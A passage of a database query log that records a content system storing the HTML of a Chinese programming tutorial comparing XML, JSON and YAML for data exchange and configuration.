</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2629"> <span data-slate-object="text" data-key="2630"><span data-slate-leaf="true" 
data-offset-key="2630:0" data-first-offset="true"><span data-slate-string="true"> name: Shanghai</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2631"> <span data-slate-object="text" data-key="2632"><span data-slate-leaf="true" 
data-offset-key="2632:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="2632:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_8242281315" data-annotation-type="annotation"><span data-slate-string="true">id</span></span></span><span 
data-slate-leaf="true" data-offset-key="2632:2"><span data-slate-string="true">: </span></span><span 
data-slate-leaf="true" data-offset-key="2632:3"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_6895277534" data-annotation-type="annotation"><span data-slate-string="true">2</span></span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <div class="se-abcb3743 " data-slate-type="paragraph" data-slate-object="block" data-key="2633"> 
<span data-slate-object="text" data-key="2634"><span data-slate-leaf="true" data-offset-key="2634:0" 
data-first-offset="true"><span data-slate-string="true">你看，这种方式对于层次结构的表达，可以说比 XML 或 JSON 更为清晰。对于 
XML 和 JSON 的表达，对于每一层节点，你都要去找结尾标记，并和节点开头标记对应起来看；但是 YAML 则完全不用，它利用了人阅读的时候，一行一行往下顺序进行的特性，利用直观的缩进块来表达一个特定深度的节点。对于某些强调层次结构的特定信息表达的场景，比如说电子邮件消息，或者是商品信息、候选人的简历等等，使用 
YAML 比其它的数据交换格式都要直接和清晰。</span></span></span> </div> <div class="se-51d7d59f " data-slate-type="paragraph" 
data-slate-object="block" data-key="2635"> <span data-slate-object="text" data-key="2636"><span 
data-slate-leaf="true" data-offset-key="2636:0" data-first-offset="true"><span data-slate-string="true">值得注意的是，对于缩进，YAML 
要求不可以使用 TAB，只能使用空格，这和 Python 是不同的；而对于每层缩进多少个空格，这不重要，只要保证不同层次的缩进空格数量不同即可，这一点和 Python 是相同的。</span></span></span> 
</div> <div class="se-717847c7 " data-slate-type="paragraph" data-slate-object="block" data-key="2637"> 
<span data-slate-object="text" data-key="2638"><span data-slate-leaf="true" data-offset-key="2638:0" 
data-first-offset="true"><span class="se-3f105e0f" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">YAML 由于极强的可读性，它在数据类型的明确性上做了一定程度的牺牲。</span></span></span></span><span 
data-slate-object="text" data-key="2639"><span data-slate-leaf="true" data-offset-key="2639:0" 
data-first-offset="true"><span data-slate-string="true">从上面的例子你可以发现，本来我们希望 name 是字符串，id 是数值，可是 
YAML 它根本不关心这一点，如你所见，字符串也没有双引号修饰，它只是诚实地把具体的文本数值罗列展示出来罢了。这一点，在我们权衡不同的数据交换格式的时候（比如设计哪一种格式作为我们的模块配置项文件），需要注意。</span></span></span> 
</div> <h2 class="se-a9871e2d" data-slate-type="heading" data-slate-object="block" data-key="2640"><span 
data-slate-object="text" data-key="2641"><span data-slate-leaf="true" data-offset-key="2641:0" 
data-first-offset="true"><span data-slate-string="true">总结思考</span></span></span></h2> <div 
class="se-f7ed2e71 " data-slate-type="paragraph" data-slate-object="block" data-key="2642"> 
<span data-slate-object="text" data-key="2643"><span data-slate-leaf="true" data-offset-key="2643:0" 
data-first-offset="true"><span data-slate-string="true">今天我们一边动手比较、一边学习了 XML 和 JSON 的前前后后，包括它们的风格、schema 
和路径表达式等等，并在之后了解了可读性至上的另一种数据交换语言 YAML。希望这些内容能够帮助你对于这些数据交换语言有更为全面的认识，并能够在工作中选择合适的技术来解决实际问题。</span></span></span> 
</div> <div class="se-0bea36b2 " data-slate-type="paragraph" data-slate-object="block" data-key="2644"> 
<span data-slate-object="text" data-key="2645"><span data-slate-leaf="true" data-offset-key="2645:0" 
data-first-offset="true"><span data-slate-string="true">今天的提问环节，我想换个形式。这一讲我们已经比较了许多 XML 和 JSON 
的特性了，其中一些涉及到了它们之间的优劣。那么，你能不能归纳出 XML 和 JSON 各自的一些优劣来呢？比如有这样几个方面供你参考，当然，你完全可以谈其它方面：</span></span></span> 
</div> <div class="se-dcf81a53" data-slate-type="list" data-slate-object="block" data-key="2646"> 
<div class="se-4a910080 se-97645ca6" data-slate-type="list-line" data-slate-object="block" 
data-key="2647"> <span data-slate-object="text" data-key="2648"><span data-slate-leaf="true" 
data-offset-key="2648:0" data-first-offset="true"><span data-slate-string="true">报文大小；</span></span></span> 
</div> <div class="se-ab852612 se-c35aa9e5" data-slate-type="list-line" data-slate-object="block" 
data-key="2649"> <span data-slate-object="text" data-key="2650"><span data-slate-leaf="true" 
data-offset-key="2650:0" data-first-offset="true"><span data-slate-string="true">数据类型的表达能力；</span></span></span> 
</div> <div class="se-c718b77a se-cd5b53ae" data-slate-type="list-line" data-slate-object="block" 
data-key="2651"> <span data-slate-object="text" data-key="2652"><span data-slate-leaf="true" 
data-offset-key="2652:0" data-first-offset="true"><span data-slate-string="true">Schema 的支持；</span></span></span> 
</div> <div class="se-321ba477 se-e1d307bb" data-slate-type="list-line" data-slate-object="block" 
data-key="2653"> <span data-slate-object="text" data-key="2654"><span data-slate-leaf="true" 
data-offset-key="2654:0" data-first-offset="true"><span data-slate-string="true">可读性；</span></span></span> 
</div> <div class="se-de4a142e se-1b29e67f" data-slate-type="list-line" data-slate-object="block" 
data-key="2655"> <span data-slate-object="text" data-key="2656"><span data-slate-leaf="true" 
data-offset-key="2656:0" data-first-offset="true"><span data-slate-string="true">数据校验的支持性；</span></span></span> 
</div> <div class="se-ca5f8105 se-a12d1e13" data-slate-type="list-line" data-slate-object="block" 
data-key="2657"> <span data-slate-object="text" data-key="2658"><span data-slate-leaf="true" 
data-offset-key="2658:0" data-first-offset="true"><span data-slate-string="true">序列化和反序列化（编程访问）的难易程度；</span></span></span> 
</div> <div class="se-46559b54 se-dc3091a1" data-slate-type="list-line" data-slate-object="block" 
data-key="2659"> <span data-slate-object="text" data-key="2660"><span data-slate-leaf="true" 
data-offset-key="2660:0" data-first-offset="true"><span data-slate-string="true">程序处理的性能；</span></span></span> 
</div> <div class="se-17a7f1b4 se-7531e02f" data-slate-type="list-line" data-slate-object="block" 
data-key="2661"> <span data-slate-object="text" data-key="2662"><span data-slate-leaf="true" 
data-offset-key="2662:0" data-first-offset="true"><span data-slate-string="true">Web 中的普适性；</span></span></span> 
</div> <div class="se-6fb78c27 se-731b37cb" data-slate-type="list-line" data-slate-object="block" 
data-key="2663"> <span data-slate-object="text" data-key="2664"><span data-slate-leaf="true" 
data-offset-key="2664:0" data-first-offset="true"><span data-slate-string="true">可扩展性（自定义 DSL 
的能力）；</span></span></span> </div> <div class="se-dbb82d7c se-137c2263" data-slate-type="list-line" 
data-slate-object="block" data-key="2665"> <span data-slate-object="text" data-key="2666"><span 
data-slate-leaf="true" data-offset-key="2666:0" data-first-offset="true"><span data-slate-string="true">……</span></span></span> 
</div> </div> <h2 class="se-3ee5bdd2" data-slate-type="heading" data-slate-object="block" data-key="2667"><span 
data-slate-object="text" data-key="2668"><span data-slate-leaf="true" data-offset-key="2668:0" 
data-first-offset="true"><span data-slate-string="true">扩展阅读</span></span></span></h2> <div 
class="se-b4b895d4" data-slate-type="list" data-slate-object="block" data-key="2669"> <div 
class="se-a42b9d88 se-38a63bce" data-slate-type="list-line" data-slate-object="block" data-key="2670"> 
<span data-slate-object="text" data-key="2671"><span data-slate-leaf="true" data-offset-key="2671:0" 
data-first-offset="true"><span data-slate-string="true">关于 DTD，你可以在</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="2672" class="se-e48fb8fa se-7e5be227"><span 
data-slate-object="text" data-key="2673"><span data-slate-leaf="true" data-offset-key="2673:0" 
data-first-offset="true"><span data-slate-string="true">这里</span></span></span></a><span data-slate-object="text" 
data-key="2674"><span data-slate-leaf="true" data-offset-key="2674:0" data-first-offset="true"><span 
data-slate-string="true">找到许多例子；而 XSD，它的例子则在</span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="2675" class="se-e48fb8fa se-7e5be227"><span data-slate-object="text" 
data-key="2676"><span data-slate-leaf="true" data-offset-key="2676:0" data-first-offset="true"><span 
data-slate-string="true">这里</span></span></span></a><span data-slate-object="text" data-key="2677"><span 
data-slate-leaf="true" data-offset-key="2677:0" data-first-offset="true"><span data-slate-string="true">。而且，在 
</span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="2678" class="se-e48fb8fa 
se-7e5be227"><span data-slate-object="text" data-key="2679"><span data-slate-leaf="true" data-offset-key="2679:0" 
data-first-offset="true"><span data-slate-string="true">XML Schema 与 XML DTD 的技术比较与分析</span></span></span></a><span 
data-slate-object="text" data-key="2680"><span data-slate-leaf="true" data-offset-key="2680:0" 
data-first-offset="true"><span data-slate-string="true">这篇文章里，你可以得知为什么 W3C 最后选择了 XSD，而不是 DTD。另外，对于 
XSD 的批评，你可以参看</span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="2681" 
class="se-e48fb8fa se-7e5be227"><span data-slate-object="text" data-key="2682"><span data-slate-leaf="true" 
data-offset-key="2682:0" data-first-offset="true"><span data-slate-string="true">这里</span></span></span></a><span 
data-slate-object="text" data-key="2683"><span data-slate-leaf="true" data-offset-key="2683:0" 
data-first-offset="true"><span data-slate-string="true">。</span></span></span> </div> <div 
class="se-c0030a1c se-f2d17da9" data-slate-type="list-line" data-slate-object="block" data-key="2684"> 
<span data-slate-object="text" data-key="2685"><span data-slate-leaf="true" data-offset-key="2685:0" 
data-first-offset="true"><span data-slate-string="true">对于 XPath，如果想全面地了解它的语法，请参阅 </span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="2686" class="se-e48fb8fa se-7e5be227"><span 
data-slate-object="text" data-key="2687"><span data-slate-leaf="true" data-offset-key="2687:0" 
data-first-offset="true"><span data-slate-string="true">XPath 词条</span></span></span></a><span 
data-slate-object="text" data-key="2688"><span data-slate-leaf="true" data-offset-key="2688:0" 
data-first-offset="true"><span data-slate-string="true">；如果你想检验所学，校验自己书写的 XPath 的正确性，那么你可以使用</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="2689" class="se-e48fb8fa se-7e5be227"><span 
data-slate-object="text" data-key="2690"><span data-slate-leaf="true" data-offset-key="2690:0" 
data-first-offset="true"><span data-slate-string="true">这个工具</span></span></span></a><span 
data-slate-object="text" data-key="2691"><span data-slate-leaf="true" data-offset-key="2691:0" 
data-first-offset="true"><span data-slate-string="true">，这个工具和文中介绍的 Xpath Generator 配合起来使用，可以非常有效地帮助你理解 
XPath。</span></span></span> </div> <div class="se-a97536e6 se-7148fcc4" data-slate-type="list-line" 
data-slate-object="block" data-key="2692"> <span data-slate-object="text" data-key="2693"><span 
data-slate-leaf="true" data-offset-key="2693:0" data-first-offset="true"><span data-slate-string="true">相应的，对于 
JSONPath，你可以阅读</span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="2694" 
class="se-e48fb8fa se-7e5be227"><span data-slate-object="text" data-key="2695"><span data-slate-leaf="true" 
data-offset-key="2695:0" data-first-offset="true"><span data-slate-string="true">这篇文章</span></span></span></a><span 
data-slate-object="text" data-key="2696"><span data-slate-leaf="true" data-offset-key="2696:0" 
data-first-offset="true"><span data-slate-string="true">来进一步了解它的语法，你也可以使用</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="2697" class="se-e48fb8fa se-7e5be227"><span 
data-slate-object="text" data-key="2698"><span data-slate-leaf="true" data-offset-key="2698:0" 
data-first-offset="true"><span data-slate-string="true">这个工具</span></span></span></a><span 
data-slate-object="text" data-key="2699"><span data-slate-leaf="true" data-offset-key="2699:0" 
data-first-offset="true"><span data-slate-string="true">来校验其正确性。</span></span></span> </div> 
<div class="se-6b01fe48 se-5e1a3c4a" data-slate-type="list-line" data-slate-object="block" 
data-key="2700"> <span data-slate-object="text" data-key="2701"><span data-slate-leaf="true" 
data-offset-key="2701:0" data-first-offset="true"><span data-slate-string="true">对于 YAML，你可以阅读</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="2702" class="se-e48fb8fa se-7e5be227"><span 
data-slate-object="text" data-key="2703"><span data-slate-leaf="true" data-offset-key="2703:0" 
data-first-offset="true"><span data-slate-string="true">这个词条</span></span></span></a><span 
data-slate-object="text" data-key="2704"><span data-slate-leaf="true" data-offset-key="2704:0" 
data-first-offset="true"><span data-slate-string="true">来获得较为全面的了解；另外，你可能听说过 YAML 和 JSON 之间的超集与子集这样的关系，那我推荐你阅读 
YAML 官方文档的</span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="2705" 
class="se-e48fb8fa se-7e5be227"><span data-slate-object="text" data-key="2706"><span data-slate-leaf="true" 
data-offset-key="2706:0" data-first-offset="true"><span data-slate-string="true">这一小段</span></span></span></a><span 
data-slate-object="text" data-key="2707"><span data-slate-leaf="true" data-offset-key="2707:0" 
data-first-offset="true"><span data-slate-string="true">关于它与 JSON 的区别和联系。</span></span></span> 
</div> <div class="se-2d0d6f51 se-5bb0a121" data-slate-type="list-line" data-slate-object="block" 
data-key="2708"> <span data-slate-object="text" data-key="2709"><span data-slate-leaf="true" 
data-offset-key="2709:0" data-first-offset="true"><span data-slate-string="true">文中介绍了数据交换语言这个大家族中的三个，其实还有其它成员，你可以阅读一</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="2710" class="se-e48fb8fa se-7e5be227"><span 
data-slate-object="text" data-key="2711"><span data-slate-leaf="true" data-offset-key="2711:0" 
data-first-offset="true"><span data-slate-string="true">下这个列表</span></span></span></a><span 
data-slate-object="text" data-key="2712"><span data-slate-leaf="true" data-offset-key="2712:0" 
data-first-offset="true"><span data-slate-string="true">。</span></span></span> </div> </div> 
<div class="se-dc77799b" data-slate-type="image" data-slate-object="block" data-key="2713"> 
<img class="se-9366ed47" src="https://static001.geekbang.org/resource/image/11/8b/1181246bbd51ce348d5729696d1dc28b.jpg"> 
</div> </div>', '', 'book', 0, 'full_html', 'zh-hans', 6, 6) 
 {executed in 18 msec}
2020-11-19 11:02:01.009 INFO  jdbc.sqltiming Line:373 - select nodebodyen0_.entity_id as entity_i1_3_0_, nodebodyen0_.body_value as body_val2_3_0_, 
nodebodyen0_.body_summary as body_sum3_3_0_, nodebodyen0_.bundle as bundle4_3_0_, nodebodyen0_.delta 
as delta5_3_0_, nodebodyen0_.body_format as body_for6_3_0_, nodebodyen0_.langcode as langcode7_3_0_, 
nodebodyen0_.revision_id as revision8_3_0_ from node__body nodebodyen0_ where nodebodyen0_.entity_id=6 
 {executed in 0 msec}
2020-11-19 11:02:01.010 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 11:02:01.027 INFO  jdbc.sqltiming Line:373 - insert into node__body (body_value, body_summary, bundle, delta, body_format, langcode, revision_id, 
entity_id) values ('<div data-slate-editor="true" data-key="2339" autocorrect="off" spellcheck="false" 
data-gramm="false" style="outline: none; white-space: pre-wrap; overflow-wrap: break-word;"> 
<div class="se-1310cd02 " data-slate-type="paragraph" data-slate-object="block" data-key="2340"> 
<span data-slate-object="text" data-key="2341"><span data-slate-leaf="true" data-offset-key="2341:0" 
data-first-offset="true"><span data-slate-string="true">你好，我是四火。</span></span></span> </div> 
<div class="se-cf537f58 " data-slate-type="paragraph" data-slate-object="block" data-key="2342"> 
<span data-slate-object="text" data-key="2343"><span data-slate-leaf="true" data-offset-key="2343:0" 
data-first-offset="true"><span data-slate-string="true">XML 和 JSON，是程序员几乎每天都会打交道的数据、特别是配置数据的承载格式。我想你心里应该有一个大致的印象，它们二者各有什么优劣，但是也许没有系统地比较过。那今天我们就把它们放到一起，丁是丁卯是卯地分析分析，对比一下它们各自的特点。另外，这些年来，对于配置，特别是复杂 
DSL 的配置，YAML 也逐渐流行开来，因此我们也把它拿过来剖析一番。</span></span></span> </div> <h2 class="se-c3225a1f" data-slate-type="heading" 
data-slate-object="block" data-key="2344"><span data-slate-object="text" data-key="2345"><span 
data-slate-leaf="true" data-offset-key="2345:0" data-first-offset="true"><span data-slate-string="true">XML 
和 JSON 的比较</span></span></span></h2> <div class="se-8db7f6f7 " data-slate-type="paragraph" 
data-slate-object="block" data-key="2346"> <span data-slate-object="text" data-key="2347"><span 
data-slate-leaf="true" data-offset-key="2347:0" data-first-offset="true"><span data-slate-string="true">XML 
全称叫做 Extensible Markup Language，就像 HTML、CSS 一样，是一种标记语言（标记语言不属于传统意义上的编程语言），且是一种具备结构化特征的数据交换语言；类似地，JSON，也就是 
JavaScript Object Notation，被称作 JavaScript 对象表示法，非结构化，更轻量，但归根结底也是一种数据交换语言。因此，二者具备相当程度的相似性，在实际应用中，往往也可以比较和替代。</span></span></span> 
</div> <h3 class="se-afa0f8e1" data-slate-type="heading" data-slate-object="block" data-key="2348"><span 
data-slate-object="text" data-key="2349"><span data-slate-leaf="true" data-offset-key="2349:0" 
data-first-offset="true"><span data-slate-string="true">1. 简洁还是严谨</span></span></span></h3> 
<div class="se-cd850df0 " data-slate-type="paragraph" data-slate-object="block" data-key="2350"> 
<span data-slate-object="text" data-key="2351"><span data-slate-leaf="true" data-offset-key="2351:0" 
data-first-offset="true"><span data-slate-string="true">在 </span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="2352" class="se-e48fb8fa se-7e5be227"><span data-slate-object="text" 
data-key="2353"><span data-slate-leaf="true" data-offset-key="2353:0" data-first-offset="true"><span 
data-slate-string="true">[第 04 讲]</span></span></span></a><span data-slate-object="text" data-key="2354"><span 
data-slate-leaf="true" data-offset-key="2354:0" data-first-offset="true"><span data-slate-string="true"> 
的时候，我介绍了 REST 和 SOAP 这样一个简洁、一个严谨的俩兄弟。而在本讲中，JSON 和 XML 也在一定程度上同样满足这样的比较关系，JSON 往往是更为简洁、快速的那一个，而 
XML 则更为严谨、周全。</span></span></span> </div> <div class="se-43666656 " data-slate-type="paragraph" 
data-slate-object="block" data-key="2355"> <span data-slate-object="text" data-key="2356"><span 
data-slate-leaf="true" data-offset-key="2356:0" data-first-offset="true"><span data-slate-string="true">我们来看一个简单的例子，id 
为 1 的城市北京：</span></span></span> </div> <div class="se-60f00485 se-8e1eae14" data-slate-type="pre" 
data-slate-object="block" data-key="2357" data-code-language="javascript"> <div class="se-9eedb5b6 
se-0113d8d7"> <span></span> </div> <div class="se-0bcc8057"> <div class="se-2334fb14 se-b056eacb" 
data-code-line-number="1"></div> <div class="se-2334fb14 se-b056eacb" data-code-line-number="2"></div> 
<div class="se-2334fb14 se-b056eacb" data-code-line-number="3"></div> <div class="se-2334fb14 
se-b056eacb" data-code-line-number="4"></div> <div class="se-2334fb14 se-b056eacb" data-code-line-number="5"></div> 
</div> <div class="se-f1068f88 ps"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="2358"> <span data-slate-object="text" data-key="2359"><span 
data-slate-leaf="true" data-offset-key="2359:0" data-first-offset="true"><span data-slate-string="true">&lt;?xml 
version=</span></span><span data-slate-leaf="true" data-offset-key="2359:1"><span class=" gkhl-string" 
data-slate-object="annotation" data-annotation-key="gkann_5522759797" data-annotation-type="annotation"><span 
data-slate-string="true">"1.0"</span></span></span><span data-slate-leaf="true" data-offset-key="2359:2"><span 
data-slate-string="true"> encoding=</span></span><span data-slate-leaf="true" data-offset-key="2359:3"><span 
class=" gkhl-string" data-slate-object="annotation" data-annotation-key="gkann_8694490961" 
data-annotation-type="annotation"><span data-slate-string="true">"UTF-8"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2359:4"><span data-slate-string="true"> ?&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2360"> <span data-slate-object="text" data-key="2361"><span data-slate-leaf="true" 
data-offset-key="2361:0" data-first-offset="true"><span data-slate-string="true">&lt;city&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2362"> <span data-slate-object="text" data-key="2363"><span data-slate-leaf="true" 
data-offset-key="2363:0" data-first-offset="true"><span data-slate-string="true"> &lt;name&gt;Beijing&lt;/name&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2364"> <span data-slate-object="text" data-key="2365"><span data-slate-leaf="true" 
data-offset-key="2365:0" data-first-offset="true"><span data-slate-string="true"> &lt;id&gt;1&lt;id&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2366"> <span data-slate-object="text" data-key="2367"><span data-slate-leaf="true" 
data-offset-key="2367:0" data-first-offset="true"><span data-slate-string="true">&lt;/city&gt;</span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <div class="se-06d200ad " data-slate-type="paragraph" data-slate-object="block" data-key="2368"> 
<span data-slate-object="text" data-key="2369"><span data-slate-leaf="true" data-offset-key="2369:0" 
data-first-offset="true"><span data-slate-string="true">如果用 JSON 表示：</span></span></span> </div> 
<div class="se-9d4e461c se-f65b62b0" data-slate-type="pre" data-slate-object="block" data-key="2370" 
data-code-language="javascript"> <div class="se-8203323c se-7137710b"> <span></span> </div> 
<div class="se-0545c819"> <div class="se-68ee3d0c se-ff7769d3" data-code-line-number="1"></div> 
<div class="se-68ee3d0c se-ff7769d3" data-code-line-number="2"></div> <div class="se-68ee3d0c 
se-ff7769d3" data-code-line-number="3"></div> <div class="se-68ee3d0c se-ff7769d3" data-code-line-number="4"></div> 
<div class="se-68ee3d0c se-ff7769d3" data-code-line-number="5"></div> <div class="se-68ee3d0c 
se-ff7769d3" data-code-line-number="6"></div> </div> <div class="se-762e9729 ps"> <div class="se-51dc759d 
se-59b5131a" data-slate-type="code-line" data-slate-object="block" data-key="2371"> <span data-slate-object="text" 
data-key="2372"><span data-slate-leaf="true" data-offset-key="2372:0" data-first-offset="true"><span 
data-slate-string="true">{</span></span></span> </div> <div class="se-51dc759d se-59b5131a" 
data-slate-type="code-line" data-slate-object="block" data-key="2373"> <span data-slate-object="text" 
data-key="2374"><span data-slate-leaf="true" data-offset-key="2374:0" data-first-offset="true"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="2374:1"><span 
class=" gkhl-string" data-slate-object="annotation" data-annotation-key="gkann_7217993161" 
data-annotation-type="annotation"><span data-slate-string="true">"city"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2374:2"><span data-slate-string="true">: {</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2375"> <span data-slate-object="text" data-key="2376"><span data-slate-leaf="true" 
data-offset-key="2376:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="2376:1"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_4600783011" data-annotation-type="annotation"><span data-slate-string="true">"name"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2376:2"><span data-slate-string="true">: </span></span><span 
data-slate-leaf="true" data-offset-key="2376:3"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_5178591359" data-annotation-type="annotation"><span data-slate-string="true">"Beijing"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2376:4"><span data-slate-string="true">,</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2377"> <span data-slate-object="text" data-key="2378"><span data-slate-leaf="true" 
data-offset-key="2378:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="2378:1"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_8328550213" data-annotation-type="annotation"><span data-slate-string="true">"id"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2378:2"><span data-slate-string="true">: </span></span><span 
data-slate-leaf="true" data-offset-key="2378:3"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_4223288755" data-annotation-type="annotation"><span data-slate-string="true">1</span></span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2379"> <span data-slate-object="text" data-key="2380"><span data-slate-leaf="true" 
data-offset-key="2380:0" data-first-offset="true"><span data-slate-string="true"> }</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2381"> <span data-slate-object="text" data-key="2382"><span data-slate-leaf="true" 
data-offset-key="2382:0" data-first-offset="true"><span data-slate-string="true">}</span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <div class="se-fb7fda24 " data-slate-type="paragraph" data-slate-object="block" data-key="2383"> 
<span data-slate-object="text" data-key="2384"><span data-slate-leaf="true" data-offset-key="2384:0" 
data-first-offset="true"><span data-slate-string="true">你可能会说，除了 XML tag 的名字，在 JSON 中只需要写一遍以外，看起来复杂复杂、严谨的程度似乎也差不太多啊。</span></span></span> 
</div> <div class="se-44b9c051 " data-slate-type="paragraph" data-slate-object="block" data-key="2385"> 
<span data-slate-object="text" data-key="2386"><span data-slate-leaf="true" data-offset-key="2386:0" 
data-first-offset="true"><span data-slate-string="true">别急，往下看。XML 的结构，强制要求每一个内容数据，都必须具备能够说明它的结构，而 
JSON 则没有这样的要求。比方说，如果我们把城市组成数组，用 XML 来表示，请你把这个文件存成 cities.xml，因为我们会多次用到这个文件：</span></span></span> 
</div> <div class="se-2e9ab12f se-994a1776" data-slate-type="pre" data-slate-object="block" 
data-key="2387" data-code-language="javascript"> <div class="se-86b5a6d3 se-3cbac57f"> <span></span> 
</div> <div class="se-699debf3"> <div class="se-9fe4a25d se-5dfcb43c" data-code-line-number="1"></div> 
<div class="se-9fe4a25d se-5dfcb43c" data-code-line-number="2"></div> <div class="se-9fe4a25d 
se-5dfcb43c" data-code-line-number="3"></div> <div class="se-9fe4a25d se-5dfcb43c" data-code-line-number="4"></div> 
<div class="se-9fe4a25d se-5dfcb43c" data-code-line-number="5"></div> <div class="se-9fe4a25d 
se-5dfcb43c" data-code-line-number="6"></div> <div class="se-9fe4a25d se-5dfcb43c" data-code-line-number="7"></div> 
<div class="se-9fe4a25d se-5dfcb43c" data-code-line-number="8"></div> <div class="se-9fe4a25d 
se-5dfcb43c" data-code-line-number="9"></div> <div class="se-9fe4a25d se-5dfcb43c" data-code-line-number="10"></div> 
<div class="se-9fe4a25d se-5dfcb43c" data-code-line-number="11"></div> </div> <div class="se-ba13022f 
ps"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2388"> <span data-slate-object="text" data-key="2389"><span data-slate-leaf="true" 
data-offset-key="2389:0" data-first-offset="true"><span data-slate-string="true">&lt;?xml version=</span></span><span 
data-slate-leaf="true" data-offset-key="2389:1"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_8225683851" data-annotation-type="annotation"><span data-slate-string="true">"1.0"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2389:2"><span data-slate-string="true"> encoding=</span></span><span 
data-slate-leaf="true" data-offset-key="2389:3"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_7248296727" data-annotation-type="annotation"><span data-slate-string="true">"UTF-8"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2389:4"><span data-slate-string="true"> ?&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2390"> <span data-slate-object="text" data-key="2391"><span data-slate-leaf="true" 
data-offset-key="2391:0" data-first-offset="true"><span data-slate-string="true">&lt;cities&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2392"> <span data-slate-object="text" data-key="2393"><span data-slate-leaf="true" 
data-offset-key="2393:0" data-first-offset="true"><span data-slate-string="true"> &lt;city&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2394"> <span data-slate-object="text" data-key="2395"><span data-slate-leaf="true" 
data-offset-key="2395:0" data-first-offset="true"><span data-slate-string="true"> &lt;name&gt;Beijing&lt;/name&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2396"> <span data-slate-object="text" data-key="2397"><span data-slate-leaf="true" 
data-offset-key="2397:0" data-first-offset="true"><span data-slate-string="true"> &lt;id&gt;1&lt;/id&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2398"> <span data-slate-object="text" data-key="2399"><span data-slate-leaf="true" 
